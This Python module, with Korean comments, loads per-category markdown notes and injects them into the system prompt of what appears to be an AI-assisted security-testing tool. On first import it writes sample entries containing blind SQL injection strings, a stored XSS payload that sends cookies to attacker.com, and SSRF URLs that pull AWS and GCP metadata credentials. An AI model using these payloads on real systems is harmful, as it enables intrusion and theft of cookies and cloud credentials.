"""
bingo/knowledge/loader.py — 로컬 지식 베이스 로더

~/.bingo/knowledge/<카테고리>/*.md 파일을 스캔해
AI 대화 시 관련 KB 내용을 시스템 프롬프트에 동적 주입.
카테고리 = 폴더명 (예: SQLi, XSS, SSRF, LFI, OAuth, JWT …)
"""
from __future__ import annotations

import re
from pathlib import Path
from typing import Dict, List, Optional, Tuple


def _kb_root() -> Path:
    d = Path.home() / ".bingo" / "knowledge"
    d.mkdir(parents=True, exist_ok=True)
    return d


class KBEntry:
    def __init__(self, category: str, title: str, content: str, path: Path) -> None:
        self.category = category
        self.title = title
        self.content = content
        self.path = path
        self._keywords: Optional[List[str]] = None

    def keywords(self) -> List[str]:
        if self._keywords is None:
            words = re.findall(r"\b[A-Za-z0-9_\-]{3,}\b", self.title + " " + self.category)
            self._keywords = [w.lower() for w in words]
        return self._keywords

    def matches(self, query: str) -> bool:
        q = query.lower()
        return any(kw in q for kw in self.keywords())


class KBLoader:
    """
    지식 베이스 로더.

    사용법:
        kb = KBLoader()
        kb.load()
        snippet = kb.inject_for("sql injection bypass")
    """

    def __init__(self, root: Optional[str] = None) -> None:
        self._root = Path(root) if root else _kb_root()
        self._entries: List[KBEntry] = []
        self._loaded = False

    def load(self) -> int:
        self._entries = []
        for md in self._root.rglob("*.md"):
            try:
                content = md.read_text(encoding="utf-8")
                category = md.parent.name
                title = md.stem.replace("-", " ").replace("_", " ")
                self._entries.append(KBEntry(category, title, content, md))
            except Exception:
                pass
        self._loaded = True
        return len(self._entries)

    def search(self, query: str, top_k: int = 3) -> List[KBEntry]:
        if not self._loaded:
            self.load()
        matched = [e for e in self._entries if e.matches(query)]
        return matched[:top_k]

    def inject_for(self, query: str, max_chars: int = 2000) -> str:
        """쿼리와 관련된 KB 내용을 AI 주입용 텍스트로 반환."""
        entries = self.search(query)
        if not entries:
            return ""
        parts = ["[KNOWLEDGE BASE]"]
        remaining = max_chars
        for e in entries:
            snippet = e.content[:remaining]
            parts.append(f"# [{e.category}] {e.title}\n{snippet}")
            remaining -= len(snippet)
            if remaining <= 0:
                break
        return "\n\n".join(parts) + "\n"

    def list_categories(self) -> List[str]:
        if not self._loaded:
            self.load()
        cats: Dict[str, int] = {}
        for e in self._entries:
            cats[e.category] = cats.get(e.category, 0) + 1
        return [f"{k} ({v})" for k, v in sorted(cats.items())]

    def count(self) -> int:
        return len(self._entries)


# ── 내장 샘플 KB 생성 (첫 실행 시) ───────────────────────────────────
def _seed_builtin_kb() -> None:
    try:
        root = _kb_root()
        samples = {
            "SQLi": ("blind-sqli.md", "# Blind SQL Injection\n\n## Time-based\n```\n' AND SLEEP(5)--\n' AND 1=IF(1=1,SLEEP(5),0)--\n```\n\n## Boolean-based\n```\n' AND 1=1--\n' AND 1=2--\n```\n"),
            "XSS": ("stored-xss.md", "# Stored XSS Payloads\n\n```\n<script>fetch('//attacker.com/?c='+document.cookie)</script>\n<img src=x onerror=eval(atob('...'))\n```\n"),
            "SSRF": ("cloud-metadata.md", "# SSRF Cloud Metadata\n\n## AWS\n```\nhttp://169.254.169.254/latest/meta-data/iam/security-credentials/\n```\n## GCP\n```\nhttp://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\n```\n"),
        }
        for cat, (fname, content) in samples.items():
            cat_dir = root / cat
            cat_dir.mkdir(exist_ok=True)
            f = cat_dir / fname
            if not f.exists():
                f.write_text(content, encoding="utf-8")
    except Exception:
        pass


_seed_builtin_kb()
